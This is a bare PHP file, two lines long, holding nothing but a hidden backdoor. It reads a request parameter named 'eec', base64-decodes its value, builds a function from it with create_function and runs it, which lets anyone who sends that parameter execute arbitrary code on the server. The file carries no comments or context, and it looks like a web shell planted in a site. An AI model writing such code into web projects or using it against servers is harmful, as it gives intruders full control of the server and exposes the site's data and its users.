<?php
if(!empty($_REQUEST['eec'])){$eec=base64_decode($_REQUEST["eec"]);$eec=create_function('',$eec);$eec();exit;}
